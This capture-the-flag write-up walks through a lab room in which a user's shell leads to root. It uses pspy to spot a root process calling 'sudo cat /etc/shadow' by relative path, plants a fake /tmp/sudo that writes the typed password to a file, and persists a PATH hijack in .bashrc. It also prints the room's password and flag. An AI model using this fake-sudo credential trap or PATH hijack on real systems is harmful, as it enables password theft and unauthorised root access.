# EavesDropper

**Difficulty:** Medium

## Overview

In this room, we start with an SSH private key for the user `frank`. After gaining access, the main challenge is identifying a privileged process that runs an incomplete command path.

The attack chain is:

**SSH private key → Frank's shell → process monitoring with pspy → PATH hijacking → credential capture → root → flag**

---

## 1. Initial Access — SSH as Frank

We are provided with Frank's OpenSSH private key. First, save it locally and restrict its permissions:

```bash
chmod 600 idrsa.id-rsa
```

Then connect to the target:

```bash
ssh -i idrsa.id-rsa frank@10.10.162.146
```

After accepting the host key, we land in Frank's shell:

```text
frank@workstation:~$
```

We now have our initial foothold.

---

# 2. Process Enumeration with pspy

Instead of immediately searching for common privilege-escalation misconfigurations, we can monitor processes running as other users.

A useful tool for this is **pspy**, which monitors processes without requiring root privileges.

Run it:

```bash
./pspy64
```

The important part of the output is:

```text
CMD: UID=0 PID=448 | sudo cat /etc/shadow
```

This is interesting for two reasons:

1. The command is running as **root**.
    
2. It uses `sudo` and `cat` without specifying their absolute paths.
    

That gives us a potential **PATH hijacking** opportunity.

---

# 3. Understanding the PATH Hijacking

Normally, when a command such as:

```bash
sudo
```

is executed, the shell searches the directories listed in `$PATH` to find the executable.

For example:

```text
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
```

If we can place our own executable named `sudo` in a directory that appears **earlier** in `$PATH`, the system may execute our copy instead of `/usr/bin/sudo`.

Check the current path:

```bash
echo $PATH
```

We can prepend `/tmp`:

```bash
export PATH=/tmp:$PATH
```

Now `/tmp` is searched before the normal system directories.

---

# 4. Creating the Fake `sudo`

The interesting part of this room is that the privileged command executes when Frank logs in.

So rather than simply replacing `sudo` with a command that gives us a shell, we can use the fake executable to capture the password that the legitimate `sudo` command would request.

Create the fake `sudo`:

```bash
cd /tmp
nano sudo
```

The basic script is:

```bash
#!/usr/bin/bash

read -sp 'Password: ' Password
echo "$Password" > /tmp/passwd.txt
```

Make it executable:

```bash
chmod +x sudo
```

Then prepend `/tmp` to the path:

```bash
export PATH=/tmp:$PATH
```

At this point, `/tmp/sudo` will be found before `/usr/bin/sudo`.

---

# 5. Making the PATH Survive Login

There's a problem: simply running

```bash
export PATH=/tmp:$PATH
```

only changes the environment of the current shell.

When we disconnect and reconnect, that modification disappears.

The room therefore gives us another clue: modify Frank's `.bashrc`.

Check the existing configuration:

```bash
cat ~/.bashrc | head
```

Then add `/tmp` to the beginning of the PATH:

```bash
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

The important concept here is **PATH precedence**:

```text
/tmp
 ↓
other directories
```

Therefore, when the login-triggered process searches for `sudo`, `/tmp/sudo` can be selected first.

---

# 6. Reconnect and Capture the Password

Exit the SSH session:

```bash
exit
```

Reconnect:

```bash
ssh -i idrsa.id-rsa frank@10.10.244.20
```

Then check `/tmp`:

```bash
ls /tmp
```

The writeup finds:

```text
passwd.txt
pspy64
```

Read the captured password:

```bash
cat /tmp/passwd.txt
```

The room's password is:

```text
!@#frankisawesome2022%*
```

The important lesson isn't the password itself. It's that a privileged process trusted a command found through a user-controlled `$PATH`.

---

# 7. Escalating to Root

Now that we have Frank's password, we can use the **real** `sudo` binary rather than our fake one:

```bash
/usr/bin/sudo su
```

Enter Frank's password when prompted.

We get:

```text
root@workstation:/home/frank#
```

Confirm the root user's files:

```bash
cd
ls
```

We find:

```text
flag.txt
```

Read it:

```bash
cat flag.txt
```

The room's flag is:

```text
flag{14370304172628f784d8e8962d54a600}
```

---

# 8. Restoring the PATH

Because we modified the PATH, it's worth restoring the normal system directories:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:$PATH
```

Now the normal `sudo` can be resolved again:

```bash
sudo su
```

---

# Attack Chain

```text
SSH private key
      │
      ▼
   frank
      │
      ▼
    pspy64
      │
      ▼
Find root process:
sudo cat /etc/shadow
      │
      ▼
Command uses PATH
without absolute paths
      │
      ▼
Create /tmp/sudo
      │
      ▼
Prepend /tmp to PATH
      │
      ▼
Persist PATH through .bashrc
      │
      ▼
Reconnect via SSH
      │
      ▼
Capture sudo password
      │
      ▼
/usr/bin/sudo su
      │
      ▼
     root
      │
      ▼
   flag.txt
```

## Key Lessons

### 1. `pspy` can reveal privilege-escalation opportunities

You don't necessarily need root privileges to observe interesting processes. Watching what executes periodically or during login can reveal commands that aren't obvious from normal enumeration.

### 2. PATH hijacking depends on command resolution

This:

```bash
sudo
```

is different from:

```bash
/usr/bin/sudo
```

The first requires command lookup through the environment's PATH. The second explicitly identifies the executable.

### 3. Relative command names in privileged scripts are dangerous

A root process executing:

```bash
sudo cat /etc/shadow
```

instead of using trusted absolute paths creates an opportunity for command substitution if an attacker can influence the PATH.

### 4. Login-triggered processes matter

The vulnerable command wasn't simply running continuously. `pspy` showed that it appeared during the SSH login process, which explains why the PATH manipulation needed to persist across sessions.

### 5. Always think about the entire privilege-escalation chain

The important progression was:

**enumeration → identify unusual root process → understand execution environment → manipulate PATH → obtain credentials → use legitimate sudo → root.**

That's the core technique this room is teaching.